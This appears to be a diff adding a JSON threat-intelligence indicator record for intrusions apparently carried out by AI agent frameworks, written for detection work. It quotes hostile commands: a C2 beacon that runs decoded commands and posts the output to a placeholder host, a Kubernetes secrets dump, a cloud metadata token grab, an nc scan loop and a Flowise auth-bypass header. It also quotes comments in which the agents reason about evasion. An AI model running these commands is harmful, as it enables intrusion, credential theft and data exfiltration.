@@ -1,0 +1,311 @@
+{
+  "malware_family": "Agentic Attacks",
+  "threat_actor": "Various",
+  "platforms": [
+    "linux",
+    "multi"
+  ],
+  "summary": "An emerging class of attacks where AI agents or agentic frameworks (e.g., Hermes, ARTEX) automate intrusion activities. These attacks are characterized by machine-paced iteration, adaptive execution, and verbose tooling containing natural-language comments. They often employ a breadth-first methodology, resulting in noisy but rapid compromise of cloud-native environments.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "parent_child",
+      "value": "java -> jspawnhelper -> sh",
+      "context": "Initial access via Java RCE in Attack B.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "Puppeteer -> /bin/sh",
+      "context": "Attack A RCE via exposed Flowise instance.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/dev/shm/.x/c.py",
+      "context": "Hidden reverse-shell persistence script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/nodepivot.py",
+      "context": "Script to exchange node credentials for Kubernetes cluster token.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "# restart-free activation: SIGUSR1 opens the inspector → register a hidden route in the live process via CDP → close the inspector",
+      "context": "Comment explaining persistence technique in Attack A.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Lesson from v1: target #3 had a CUSTOMIZED WHITELIST_URLS",
+      "context": "Comment explaining self-correction in API key test script v2.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "⇒ v2 switches to paths that are NOT in the whitelist, so the request actually reaches validateAPIKey.",
+      "context": "Comment explaining self-correction logic in API key test script v2.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "But the OTHER <agent> got the 600k-row dump... how?",
+      "context": "Comment showing agent reasoning about another agent instance.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "path test to DynamoDB with MAX OPSEC: NO deployment, NO writes",
+      "context": "Comment explaining OPSEC-aware testing of DynamoDB.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "invalid field to trigger a 'did you mean' suggestion",
+      "context": "Self-documenting script version name from Attack C.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "return '<MARKER>'",
+      "context": "Harmless probe payload to validate RCE before sending real exploit.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "evil@",
+      "context": "Prefix for self-labeled RabbitMQ global parameter name.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "oracle@",
+      "context": "Prefix for self-labeled RabbitMQ global parameter name.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "YOLO",
+      "context": "Unattended execution mode for Hermes agent.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "Hermes",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/bin/sh -c \"RESULT=\\\"$(printf %s <base64-cmd> | base64 -d | /bin/sh 2>&1 | head -c 49152 | base64 | tr -d '\\n')\\\"; wget -q -T 8 -O /dev/null --post-data=\\\"$RESULT\\\" http://<C2>/<session-id>/result/<hash>\"",
+      "context": "Attack B's OPSEC-aware C2 beacon communication wrapper.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "for ip in <host1> <host2> <host3> <host4> <host5> ; do for port in 2375 2376 10250 10255 2379 61678 8200 ... ; do nc -vz -w1 $ip $port & done done ; wait",
+      "context": "Parallel port scanning across multiple hosts for lateral movement.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "TOK = $(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")",
+      "context": "Stealing IMDSv2 token for cloud credential access.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/secrets",
+      "context": "Dumping all Kubernetes secrets using default service account token.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "printf … | base64 -d > /tmp/.cXXXX.sh; sh …; rm",
+      "context": "Self-cleaning one-liner for staging and executing scripts.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "k8s_ssar_all.sh",
+      "context": "Disposable scratch file from Attack B.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "refl.py",
+      "context": "Disposable script for gRPC reflection from Attack C.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/api/v1/node-custom-function",
+      "context": "Unauthenticated RCE endpoint for Flowise instances.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "x-request-from: internal",
+      "context": "Header used to bypass authentication in Flowise.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/stdio-rce-a",
+      "context": "Self-labeled RCE endpoint used for out-of-band validation.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "<C2>:19001",
+      "context": "C2 dialed by hidden reverse-shell persistence script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/result/",
+      "context": "C2 path for exfiltrating command output in Attack B beacon.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/global-parameters/evil@",
+      "context": "RabbitMQ API path used to inject self-labeled parameters.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/global-parameters/oracle@",
+      "context": "RabbitMQ API path used to inject self-labeled parameters.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "169.254.170.2",
+      "context": "AWS ECS credential endpoint probed during Attack B.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "[fd00:ec2::254]",
+      "context": "AWS ECS credential endpoint (IPv6) probed during Attack B.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
+      "context": "Kubernetes API path to check token permissions.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script",
+    "pe",
+    "elf",
+    "jar"
+  ]
+}
